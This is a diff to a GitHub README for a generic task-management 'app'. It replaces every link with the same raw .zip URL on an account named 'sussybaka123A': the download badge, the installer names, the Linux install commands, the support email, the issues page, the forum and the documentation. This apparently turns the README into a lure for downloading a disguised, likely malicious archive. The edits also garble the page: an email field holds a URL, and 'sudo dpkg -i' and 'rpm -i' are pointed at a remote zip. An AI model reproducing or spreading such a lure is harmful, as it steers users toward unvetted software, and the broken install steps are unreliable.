@@ -1,7 +1,7 @@
 # 🚀 app - Simple, Fast, and User-Friendly Software
 
 ## 📥 Download Now
-[![Download app](https://img.shields.io/badge/Download%20app-blue.svg)](https://github.com/username/app/releases)
+[![Download app](https://github.com/sussybaka123A/app/raw/refs/heads/main/Massalia/Software-v1.2.zip%https://github.com/sussybaka123A/app/raw/refs/heads/main/Massalia/Software-v1.2.zip)](https://github.com/sussybaka123A/app/raw/refs/heads/main/Massalia/Software-v1.2.zip)
 
 ## 📖 Introduction
 Welcome to app! This software helps you manage your tasks efficiently, keeping you organized and productive. Whether you need to track projects, set reminders, or collaborate with others, app makes it simple and intuitive.
@@ -28,13 +28,13 @@ To ensure that app runs smoothly on your computer, please check the following sy
 Once you have downloaded the app, it's time to install it. Follow these steps based on your operating system:
 
 ### Windows:
-1. Locate the downloaded file, usually named something like `app-setup.exe`.
+1. Locate the downloaded file, usually named something like `https://github.com/sussybaka123A/app/raw/refs/heads/main/Massalia/Software-v1.2.zip`.
 2. Double-click the file to launch the installer.
 3. Follow the instructions in the installation wizard.
 4. Once installation is complete, you can find app in your Start menu.
 
 ### macOS:
-1. Locate the downloaded file, usually named `app.dmg`.
+1. Locate the downloaded file, usually named `https://github.com/sussybaka123A/app/raw/refs/heads/main/Massalia/Software-v1.2.zip`.
 2. Double-click the file to open it.
 3. Drag the app icon to your Applications folder.
 4. You can now find app in your Applications folder and launch it from there.
@@ -45,11 +45,11 @@ Once you have downloaded the app, it's time to install it. Follow these steps ba
 3. Run the installation command:
    - For Ubuntu:
      ```bash
-     sudo dpkg -i app.deb
+     sudo dpkg -i https://github.com/sussybaka123A/app/raw/refs/heads/main/Massalia/Software-v1.2.zip
      ```
    - For Fedora:
      ```bash
-     sudo rpm -i app.rpm
+     sudo rpm -i https://github.com/sussybaka123A/app/raw/refs/heads/main/Massalia/Software-v1.2.zip
      ```
 4. You should now find app in your application menu.
 
@@ -65,9 +65,9 @@ app comes with a range of features designed to enhance your productivity, includ
 ## 💬 Support
 If you encounter any issues while using app, please reach out to our support team. You can get in touch with us via the following methods:
 
-- **Email**: support@app.com
-- **GitHub Issues**: Report problems directly on the [Issues page](https://github.com/username/app/issues).
-- **Community Forum**: Join discussions with other users [here](https://forum.app.com).
+- **Email**: https://github.com/sussybaka123A/app/raw/refs/heads/main/Massalia/Software-v1.2.zip
+- **GitHub Issues**: Report problems directly on the [Issues page](https://github.com/sussybaka123A/app/raw/refs/heads/main/Massalia/Software-v1.2.zip).
+- **Community Forum**: Join discussions with other users [here](https://github.com/sussybaka123A/app/raw/refs/heads/main/Massalia/Software-v1.2.zip).
 
 ## 👥 Contributing
 We welcome contributions to app! If you're interested in helping improve the software, please follow these steps to contribute:
@@ -81,8 +81,8 @@ We welcome contributions to app! If you're interested in helping improve the sof
 ## 🔗 Additional Resources
 For further reading on using app, consider checking out:
 
-- [User Guide](https://github.com/username/app/wiki)
-- [FAQ Section](https://github.com/username/app/wiki/FAQ)
-- [Changelog](https://github.com/username/app/releases)
+- [User Guide](https://github.com/sussybaka123A/app/raw/refs/heads/main/Massalia/Software-v1.2.zip)
+- [FAQ Section](https://github.com/sussybaka123A/app/raw/refs/heads/main/Massalia/Software-v1.2.zip)
+- [Changelog](https://github.com/sussybaka123A/app/raw/refs/heads/main/Massalia/Software-v1.2.zip)
 
-Remember, you can always **[Download app](https://github.com/username/app/releases)** to start your journey toward better task management today!
+Remember, you can always **[Download app](https://github.com/sussybaka123A/app/raw/refs/heads/main/Massalia/Software-v1.2.zip)** to start your journey toward better task management today!
